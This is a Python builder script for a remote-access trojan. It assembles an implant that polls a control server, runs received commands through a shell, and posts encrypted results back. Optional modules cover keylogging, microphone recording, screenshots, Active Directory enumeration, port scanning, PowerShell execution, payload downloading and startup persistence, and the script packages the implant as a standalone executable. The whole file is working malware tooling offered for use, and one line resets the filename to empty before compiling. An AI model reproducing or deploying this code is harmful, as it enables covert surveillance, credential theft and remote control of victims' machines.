import py_compile
import subprocess

base = """import subprocess
import random
import time
import uuid
import requests

from constants import CONTROL
import pyutils.encryption_utils as eu
"""
base2 = """
Buffer = 2
Interval = 10

def handle_base_command(message):
        try:
            response = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, error = response.communicate()
            if error: response = error.decode()
            else: response = output.decode()
        except Exception as e:
            response = e
        return response

def set_buffer(message):
    try:
        global Buffer
        Buffer = int(message.split(" ")[1].strip())
    except Exception as e: return e

    return f"Successfully set the buffer to {Buffer}"

def set_interval(message):
    try:
        global Interval
        Interval = int(message.split(" ")[1])
    except Exception as e: return e

    return f"Successfully set the interval to {Interval}"

def get_mac():
    mac = uuid.getnode()
    address = ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))
    return address

def get_sleep_time():
    return random.randint((Interval-Buffer) * 100, (Interval+Buffer)*100) / 100

def handle_input(message: str):
    command_handlers = {
"""
base3 = """
    }

    for prefix, handler in command_handlers.items():
        if message.startswith(prefix):
            return handler(message)

    return handle_base_command(message)

def start_server():
    mac = get_mac()
    while True:
        time.sleep(get_sleep_time())

        try:
            r = requests.get(f'http://{CONTROL}:8080')
        except Exception as e:
            print(e)
            continue

        if r.status_code == 200:
            cmds = r.content.decode().split("\\n")
            if len(cmds[0]) > 1:
                for cmd in cmds:

                    try:
                        txt = f"{cmd}\\n{handle_input(cmd)}"
                    except Exception as e:
                        txt = str(e)

                    txt = eu.encrypt(f"{mac}\\n{txt}")
                    headers = {'Content-Type': 'text/plain'}
                    r2 = requests.post(f"http://{CONTROL}:8000", data=txt, headers=headers)
                    if r2.status_code == 200: print(f"Successfully sent response for {cmd}")

if __name__ == '__main__':
    start_server()
"""

def main():
    import_dict = {"1": "ad_utils as ad", "2": "audio as a", "3": "downloader as d",
                   "4": "file_handling as fh", "5": "keylogger_handler as kh",
                   "6": "local_utils as lu", "7": "network_utils as nu",
                   "8": "powershell_utils as pu", "9": "screenshot_handling as sh"}
    
    cmd_handler_dict = {
        "1": ['"get-users": ad.get_users'],
        "2": ['"audio-record": a.handle_mic'],
        "3": ['"downloader": d.downloader'],
        "4": ['"cd": fh.handle_cd', '"mkdir": fh.handle_mkdir', '"pwd": fh.pwd', '"ls": fh.listdir_handler'],
        "5": ['"keylogger": kh.handle_keylogger'],
        "6": ['"get-processes": lu.processes', '"add-to-startup-2": lu.add_to_startup_2', '"add-to-startup-1": lu.add_to_startup_1'],
        "7": ['"scan-ports": nu.scan_ports'],
        "8": ['"powershell": pu.powershell'],
        "9": ['"screenshot": sh.handle_screenshot']
    }

    print("""Enter your choices for modules. Please enter the numbers space seperated (ex: 1 4 7)
          1: Active Directory Utils
          2: Audio Recordig Utils
          3: Downloader
          4: File Handling
          5: Keylogger
          6: Local Utils
          7: Network Utils
          8: Powershell Utils
          9: Screenshot Handler""")
    
    choices = input("Enter choices: ").split(" ")

    import_str =  ""
    all_cmds = []
    for i in choices:
        import_str += f"import pyutils.{import_dict[i]}\n"
        all_cmds.extend(cmd_handler_dict[i])

    dict_str = ",\n\t\t".join(all_cmds)
    dict_str = f"\t\t{dict_str}"

    final = f"{base}{import_str}{base2}{dict_str}{base3}"

    fname = input("Enter filename to save as: ")
    fname = fname + ".py"

    with open(fname, 'w') as f:
        f.write(final)

    fname = ""
    py_compile.compile(fname)
    subprocess.run(['pyinstaller', '--onefile', fname])

main()
